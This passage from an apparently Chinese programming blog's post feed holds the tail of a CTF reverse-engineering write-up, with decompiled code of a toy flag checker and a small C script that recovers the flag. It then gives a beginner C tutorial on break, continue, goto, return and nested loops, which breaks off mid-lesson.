class="code"><pre><span class="line"><span class="comment">// 修改后的IDA伪代码</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">12</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">18</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v6[<span class="number">17</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v5 = *(_DWORD *)&amp;v6[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;v5[<span class="number">4</span>] = *(_DWORD *)&amp;v6[<span class="number">9</span>];</span><br><span class="line">  *(_DWORD *)&amp;v5[<span class="number">8</span>] = *(_DWORD *)&amp;v6[<span class="number">13</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[v5[i] - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> v4[<span class="number">100</span>] = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>;</span><br><span class="line">    <span class="type">char</span> _data_start__[<span class="number">200</span>] = &#123;</span><br><span class="line">        <span class="number">0x7e</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0x74</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>,</span><br><span class="line">        <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>,</span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> v6[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    v6[<span class="number">0</span>] = <span class="number">65</span> ;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">67</span> ;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">84</span> ;</span><br><span class="line">    v6[<span class="number">3</span>] = <span class="number">70</span> ;</span><br><span class="line">    v6[<span class="number">4</span>] = <span class="number">123</span> ;</span><br><span class="line">    v6[<span class="number">17</span>] = <span class="number">125</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (p = &amp;v6[<span class="number">5</span>], i = <span class="number">0</span>; p != &amp;v6[<span class="number">5</span>] + <span class="number">12</span>; ++p, ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">128</span>; ++c) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v4[i] == _data_start__[c - <span class="number">1</span>]) &#123;</span><br><span class="line">                *p = c;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-8-跳转控制和嵌套</title>
      <link href="/20230671b7d09817/"/>
      <url>/20230671b7d09817/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是跳转控制">什么是跳转控制</h1><p>有时候,我们需要代码直接从一个位置直接转到另一个特定的位置继续执行,此时,我们就需要进行跳转.</p><p>例如,我们在执行某个循环时,突然到达了某个边界条件,需要立即停止循环(或者没有必要进行余下的循环),此时我们就可以直接跳出循环.</p><p>再例如,我们可能需要在同一个函数内进行一个大跨度的回溯,我们如果开循环的话,整个代码都要放在一个代码块里,如果不方便的话,我们就可以直接无条件跳转到前面.</p><h1 id="c语言跳转控制相关的语句">C语言跳转控制相关的语句</h1><h2 id="break语句">break语句</h2><p>首先来看一下<code>标准</code>的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928224409360.png" alt="image-20230928224409360" style="zoom:45%;" /><p>break语句,可以理解为&quot;跳出&quot;语句,顾名思义,用于跳出一个<code>循环体</code>或<code>switch的语句</code>.</p><p>事实上,我们在前面讲解<code>switch语句</code>的时候就已经使用到break语句,但是当时只是知道能用它来结束一个switch语句.</p><p>换句话说,break语句用于跳出一个代码块(一个复合语句),但是这个代码块仅限于<code>循环体</code>或<code>switch语句内</code>.并且,break语句会完全终止一个循环,无论循环语句中有什么需要执行的部分,都不再执行,直接跳转到整个循环后面紧邻的第一条语句继续执行.</p><p>重要的一点是,break只能跳出它直接所在的循环,而不能连续跳出,也正如标准所述:<code>break语句不能用于打破多重嵌套循环</code>.至于嵌套循环,我们很快会讲解到.</p><p>我们做一个简单的例子来使用一下break语句:</p><h3 id="例题">例题:</h3><p>输入一个正整数n,<code>判断其是否为素数</code>(素数为一个大于1的自然数，除了1和它本身外，不能被其他自然数整除).</p><p>解决:我们从定义出发,很容易想出一个暴力的做法—那就是从2到n-1依次判断是否为n的因数,如果中间有任何一个数是因数,则这个数n立即被判定为合数.</p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> n, is_prime = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (n % i == <span class="number">0</span>) &#123;</span><br><span class="line">is_prime = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_prime)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上可以有更加高效/简单的写法,但是为了说明问题,这里采用了这样的写法.</p><p>这个代码使用了一个is_prime的int变量作为<code>标志</code>,用于记录最终结果—n是否为素数.</p><p>我们开一个i从2到n-1的循环,将循环变量i作为n可能的因数,去和n做除法,如果判断出能够<code>整除</code>,就说明当前的i是n的因数.</p><p>然后,根据我们的算法,只要i在2~n-1中有任何一个是n的因数,就说明n不是素数,此时,后面的循环已经没有必要执行了,因为这里已经判断出n不是素数了,就不需要再继续了.</p><p>那么我们在if成立后,先把is_prime变量设置为0(也就是标志着n不是素数),然后使用一个<code>break语句</code>来直接结束这个循环,继续后面的代码.最后,我们使用一个if…else来进行判断,对应输出yes或no即可.</p><p>其中需要注意的是,我们使用到了一个<code>%运算符</code>,这个运算符叫<code>求模运算符</code>,用于求一个数除另一个数的余数,这两个数要求必须是整数.例如<code>7%4</code>的结果就是<code>3</code>;<code>5%1</code>的结果就是<code>0</code>.有关求模将会在讲解运算符时进行详细说明.</p><h2 id="continue语句">continue语句</h2><p>有时候,我们需要的仅仅是结束当前的<code>一次循环</code>,而不是结束整个循环语句,那么,我们需要使用<code>continue语句</code>来实现.</p><p>需要注意的是,所谓&quot;结束&quot;,仅仅指的是结束循环体,这意味着for(表达式1;表达式2;表达式3)并不受影响,我们在结束当前的一次循环时,意味着continue后面直到循环体结束的所有代码不再执行,转而直接开始下一次循环,同时,<code>表达式3</code>不受任何影响,它仍然需要执行一次再进行下一次循环的<code>表达式2</code>的判断.</p><p>同样来看一下<code>标准</code>的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230928231836072.png" alt="image-20230928231836072" style="zoom:45%;" /><p>就是这么简单,我们同样以一个例题来举例子:</p><h3 id="例题">例题:</h3><p>输出100以内所有不能被3整除的正整数.</p><p>解决:很简单,只需要剔除能被3整除的数即可,正向思维的话,我们直接把不能被3整除的数输出即可,但是这里作为例子,我们反过来,如果遇到能被3整除的数,则跳过该次循环.</p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">100</span>; ++i) &#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>) <span class="comment">// 如果i除3的余数为0,也就是i能被3整除</span></span><br><span class="line"><span class="keyword">continue</span>; <span class="comment">// 则跳过这次循环之后的所有代码,这里也就是跳过输出</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i); <span class="comment">// 否则输出i</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码就是这样,其中,再说明一下,我们把<code>int i=1</code>,也就是i的声明和初始化都放到for的第一个表达式中了,这样是没有问题的,但是这意味着这个for循环一旦结束,变量i就不能使用了,换句话说i在for循环的这个<code>块作用域</code>内.这涉及到变量的<code>作用域</code>,将会在后面进行详细的讲解.</p><h2 id="goto语句">goto语句</h2><p>除了上面的两种跳转语句,我们还有一种更加直接的<code>goto语句</code>,可以直接跳转到同函数内的任意位置,所以它也叫无条件跳转语句.</p><p>这是标准的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929000327639.png" alt="image-20230929000327639" style="zoom: 45%;" /><p>初学,我们无需关心那么多,我们只需要知道,<code>goto语句</code>和其所控制的<code>标号</code>只能在同一个函数内.</p><p>那么,一个完整的goto语句使用需要哪些内容呢?我们首先需要一个或多个标号.</p><h3 id="标号">标号</h3><p>同样先来看标准的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929001604610.png" alt="image-20230929001604610" style="zoom:45%;" /><p>也就是说,<code>标识符:</code>,<code>case 常量表达式:</code>,<code>default :</code>这3种实际上都是标号,他并不是独立的,实际上,他是对于某条语句进行了一个标号.</p><p>在switch语句中,我们习惯把<code>case 常量表达式:</code>写在单独的一行,但是实际上,它是下一行第一条语句的标号:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> score;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;score); <span class="comment">// 用于输入</span></span><br><span class="line">    <span class="keyword">switch</span> (score) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;开始游戏&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;查看排名&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;设置&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;退出&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;输入错误&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个程序中,每一个<code>case 常量表达式:</code>和最后的<code>default :</code>都是后面紧随的<code>printf(...);</code>这条语句(…为省略中间的内容)的标号!</p><h3 id="使用goto语句进行跳转">使用goto语句进行跳转</h3><p>那么goto语句实际上使用的是前面3中标号的第一个,也就是<code>标识符:</code>,有了标号,我们就可以直接这样使用:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第1个输出\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第2个输出\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> first;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第3个输出\n&quot;</span>);</span><br><span class="line">first:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;第4个输出\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929002235202.png" alt="image-20230929002235202" style="zoom:40%;" /><p>我们在程序中为<code>printf(&quot;第4个输出\n&quot;);</code>提供了一个标号first,我们在输出<code>&quot;第3个输出\n&quot;</code>之前使用goto语句进行跳转,跳转到后面继续执行,如此,第3个printf()函数的调用就被跳过了.</p><h3 id="注意">注意:</h3><p>goto语句可以说的上是非常简单粗暴,如果各位学习过汇编语言,就会发现goto语句和汇编中的loop非常相似!</p><p>但是简单粗暴意味着,它很容易破坏程序的结构,说简单点就是,如果一个程序在运行中来回不停地使用goto进行到处的跳转,那么很可能导致整个程序的运行逻辑乱七八糟的,毫无章法.</p><p>所以,C语言中的goto语句常常被许多人诟病,从而强烈建议不要使用该语句.</p><p>至于本人,我对goto语句的看法是:只要合理利用,就是好的.依然是那句话:C语言提供给了我们极大的自由度,至于如何利用好这种自由度,就看程序设计者本人的能力了.</p><p>那么goto语句,最实用的一个用途就是<code>一次性跳出多层嵌套的循环</code>,这将在下面进行讲解.</p><h2 id="return语句">return语句</h2><p>标准的描述:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230929004440108.png" alt="image-20230929004440108" style="zoom:45%;" /><p>关于return语句,应该把他放在<code>函数</code>的部分进行讲解,到目前为止,我们所有的程序都只用了一个函数:<code>main函数</code>就完成了任务,当程序越发复杂,我们需要把功能独立出来,这时候函数就派上用场了.</p><p>在此之前,我们只使用main函数来完成所有的功能.</p><p>那么return语句,就是用于结束一个函数,并返回一个值作为这个函数的返回值.</p><p>返回值很好理解,我们之前说过,C语言的函数和数学意义上的函数完全一致,那么如果我们有<code>y=f(x)</code>,最终计算出来的y就是函数的值,也就是函数值,return语句就是用于返回这个最终计算的值的.</p><p>在main函数中,我们默认使用<code>return 0;</code>返回一个0作为main函数的返回值,在main中,返回值为0代表这个程序正常结束:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//结束main函数并返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么为什么是整数<code>0</code>呢?我们之前提到过,<code>int main()</code>中第一个代表这个函数的返回值类型,那么这里的int说明main的返回值应该是一个int类型的值,那么常量0就是一个int类型的常量.</p><p>另外,如果一个函数的返回值类型是<code>void</code>,即返回值为空,那么必须写<code>return;</code>来返回,而不能带有任何表达式.</p><p>这里先简单说明一下,至于return语句的细节会在后面详细讲解.</p><p>​—WAHAHA 2023.9.28</p><h1 id="第一个难点-循环嵌套">第一个难点—循环嵌套</h1><h2 id="什么是嵌套">什么是嵌套</h2><p><code>嵌套</code>顾名思义,就是一个语句内套着另一个语句.嵌套并不是说仅仅给循环,任意语句均可以互相随意嵌套以完成各种功能.</p><p>如果对应到if语句,那么就是一层条件满足后继续进一步判断下一层条件.</p><p>对应到循环,就是循环嵌套.也就是一层循环中套着另一层循环.</p><p>循环嵌套写起来十分简单,只需要简单的将一个循环放在另外一个循环里面即可.</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 这段代码的作用是输出 0~99</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i * <span class="number">10</span> + j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然上面这个代码的功能仅需要一个循环即可实现,这里为了作为演示,有上面这种替代的写法.</p><h2 id="最常用的嵌套-for嵌套">最常用的嵌套—for嵌套</h2><h3 id="例子1-直角三角形">例子1-直角三角形</h3><h4 id="题目">题目</h4><p>输出一个直角边长为5的等腰三角形,要求使用循环,输出结果要求如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">***</span><br><span class="line">****</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><h4 id="分析">分析</h4><p>我们要输出这个图形,需要从第一行向下一行一行的输出,首先约定,<code>从今以后,我们所有的行,列都从0开始计数</code>.也就是说,逻辑上的第1行,我们称之为第0行.</p><p>第0行输出1个’*‘字符,第1行输出2个’*’,…,第n行输出n+1个’*’,…,第5行输出6个’*’.</p><p>我们可以看出,输出逻辑中有两个关键值一直在变,那就是<code>当前的行号</code>和<code>当前这行需要输出的'\*'数</code>.</p><p>而且,必须先确定一行,然后再针对这行进行逐个输出,那么很自然地,我们就能想到使用循环嵌套来实现(没想到也没关系,先来看看代码).</p><h4 id="代码">代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//输出一个直角三角形</span></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123; <span class="comment">// i指定行号,其中的 i++ 完全等价于i=i+1,此时不必有任何疑惑</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; i+<span class="number">1</span>; j++) &#123; <span class="comment">// j指定该行输出多少个字符&#x27;*&#x27;,其中的 j++ 完全等价于j=j+1,此时不必有任何疑惑</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>); <span class="comment">// 输出一个&#x27;*&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); <span class="comment">// 内层循环输出完一行后输出换行准备处理下一行</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="执行过程">执行过程</h4><p>执行的过程如下:</p><p>1.首先,进入外层的第一次循环,此时i为0,也就是正在处理第0行,然后保持i==0不变,进入第二层循环;</p><p>根据我们的公式,第n行需要输出n+1个’*’,那么第0行需要输出0+1也就是1个’*’.但是我们需要一次性写完所有行的循环,那么这里我们应该把公式放进去,那么外层循环的i就相当于这里的n,内层循环每次要执行i+1次,那么就应该是</p><p><code>for (j = 0; j &lt; i+1; j++)</code></p><p>当第一次内层循环(i一直为0)结束后,屏幕上已经输出了1个’*’—循环了i+1次也就是1次.此时外层第一次循环还没结束,因为还有一个<code>printf(&quot;\n&quot;);</code>没有执行,执行完这行后,会跳到下一行准备继续输出.</p><p>这时屏幕上是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">[注意光标在这里,因为已经换行了]</span><br></pre></td></tr></table></figure><p>2.外层循环内的一个内层循环和一个printf(&quot;\n&quot;);语句已经执行完,这时i++,变为1,准备第二次循环,也就是准备输出第1行(注意这是图像上的第二行)的2个’*’;</p><p>根据我们的公式,第1行需要输出1+1也就是2个’*’,需要内层循环两次;</p><p><code>for (j = 0; j &lt; i+1; j++)</code>在这时,j被重新赋值为0—也就是说这次内层循环的执行和上一次没有任何关系!接着,j从0到i(也就是1),循环2次,屏幕上输出了2个’*’,此时外层第二次循环还没结束,因为还有一个<code>printf(&quot;\n&quot;);</code>没有执行,执行完这行后,会跳到下一行准备继续输出.</p><p>这时屏幕上是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">**</span><br><span class="line">[注意光标在这里,因为已经换行了]</span><br></pre></td></tr></table></figure><p>3.外层循环内的一个内层循环和一个printf(&quot;\n&quot;);语句已经执行完,这时i++,变为2,准备第三次循环…</p><p>如此往复递增…</p><p>4.当第5次外层循环执行完毕,屏幕上是这样的:</p><figure 